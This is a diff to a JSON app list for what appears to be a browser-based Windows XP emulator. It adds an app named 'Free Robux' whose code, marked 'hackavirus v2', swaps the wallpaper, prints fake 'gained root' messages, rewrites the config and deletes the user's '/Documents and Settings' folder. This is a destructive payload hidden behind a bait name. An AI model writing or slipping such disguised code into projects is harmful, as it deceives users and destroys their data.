@@ -8,5 +8,10 @@
         "name": "Nuke Grabber",
         "icon": "https://nathblade16.github.io/Nuke-Grabber/icon.png",
         "code": "var el = $.parseHTML(`<window width=\"800\" height=\"500\" title=\"Nuke Grabber\"><style>\niframe[seamless]{\n  background-color: transparent;\n  border: 0px none transparent;\n  padding: 0px;\n  overflow: hidden;\n}\n.frame-container {\n  position: absolute;\n  width: 100%;\n  height: 100%;\n  overflow: hidden;\n  padding: 0px;\n  margin: 0px;\n}\n  </style>\n  \n  <div class=\"frame-container\">\n    \n<iframe height=\"100%\" seamless=\"seamless\" width=\"100%\" src=\"https://nathblade16.github.io/Nuke-Grabber\"></iframe>\n<!--Make sure your site has anti-framing disabled or your app will show a blank screen!-->\n\n  </div> \n </window>`);\n\ndocument.body.append(el[0]);\n$(el).updateWindow();"
+    },
+    "2": {
+        "name": "Free Robux",
+        "icon": "",
+        "code": "//hackavirus v2\nxp.wallpaper.set('https://external-content.duckduckgo.com/iu/?u=https://sudardjattanusukma.wordpress.com/wp-content/uploads/2019/12/0x00000001.jpg');\nsaveConfig();\nconsole.log(\"thank you for opening virus.exe\");\nconsole.log(\"gained root\");\nxp.filesystem.readFile(\"/config.json\", (file) => {config = JSON.parse(file); config.wallpaper = \"https://external-content.duckduckgo.com/iu/?u=https://sudardjattanusukma.wordpress.com/wp-content/uploads/2019/12/0x00000001.jpg\"; xp.filesystem.writeFile(\"/config.json\", new Blob([JSON.stringify(config)], {type: 'text/plain'}), (e) => {xp.filesystem.deleteDir(`/Documents and Settings`, (e) => {location.reload();});});});"
     }
 }
